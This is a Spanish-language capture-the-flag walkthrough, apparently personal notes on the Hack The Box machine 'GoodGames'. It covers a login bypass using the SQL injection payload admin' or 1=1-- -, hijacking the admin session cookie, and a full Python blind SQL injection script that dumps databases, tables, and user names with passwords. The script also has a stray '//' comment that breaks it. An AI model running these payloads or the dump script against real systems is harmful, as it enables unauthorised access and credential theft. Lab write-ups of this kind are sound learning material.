# Enumeración
1. Nos creamos una cuenta y nos deslogeamos.
2. Interceptamos la petición de login con *Caido*. Poniendo cualqueir mail valido con "@", por que si no no vamos a llegar a mandar la peticion y no la va a poder interceptar caido, ya que se hace una verificacion a nivel de navegador del @
3. En el campo del email vamos a hacer la inyeccion con:
    ```
    admin' or 1=1-- -
    ```

- Intentar saltar el login mediante una inyección SQL como por ejemplo admin' or 1 = 1 -- -
   La vulnerabilidad permite acceder como el primer usuario de la base de datos, usualmente `admin`.

4. En el campo de contraseña ponemos cualquier cosa.

Esto nos logueará como el usuario `admin`, entregándonos su cookie de sesión.

![[Goodgames3.png]]

Luego, ingresamos a nuestra cuenta previamente creada y **cambiamos la cookie de sesión por la de admin**.

![[Goodgames4.png]]

Con `CTRL + SHIFT + I` vamos a la pestaña de cookies y la modificamos.

![[Goodgames5.png]]

---

## 🛠️ Acceso al Panel Interno

Desde el panel de administrador, accedemos a la tuerquita (⚙️) que nos redirige a:

```
http://internal-administration.goodgames.htb/login
```

Debemos agregar el dominio en el archivo `/etc/hosts`:

```
10.10.11.130 internal-administration.goodgames.htb
```

![[Goodgames6.png]]

Una vez dentro, tenemos un **nuevo panel de login** en el cual no nos deja hacer ningun tipo de inyeccion

![[Goodgames7.png]]




---

# Explotacion



# Script para explotacion
En el campo de login en el cual hicimos la inyeccion previamente, con este script vamos a empezar a dumpear todos los datos, para hacernos con el usuario y la contraseña

```python
#!/usr/bin/env python3

from pwn import *
import requests, signal, sys, string, time


###CTRL +C###
def def_handler(sig, frame):
    print("\n\n Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
###Fin CTRL+C##

#Variables globales
characters = string.ascii_lowercase + "_-:,;" + string.ascii_uppercase + string.digits
main_url = "http://10.10.11.130/login"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

def sqli():

    data = ""
    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque")
    time.sleep(1)
    p2 = log.progress("Data")

    for position in range(1, 500):
        for character in characters:
            payload = f"' or substring((select group_concat(schema_name) from information_schema.schemata),{position},1)='{character}'-- -" //Dumpear bases de datos
            #payload = f"' or substring((select group_concat(table_name) from information_schema.tables where table_schema='main'),{position},1)='{character}'-- -" //Dumpear tablas
            #payload = f"' or substring((select group_concat(column_name) from information_schema.columns where table_schema='main' and table_name='user'),{position},1)='{character}'-- -" //Dumpear columnas
            #payload = f"' or substring((select group_concat(name,0x3a,password) from main.user),{position},1)='{character}'-- -" #Dumpear datos finales
            post_data = {
                "email": payload,
                "password": "test"
                }

            r = requests.post(main_url, data=post_data, headers=headers)

            if "Login Success" in r.text:
                data += character
                p2.status(data)
                break


if __name__ == '__main__':
    sqli()
```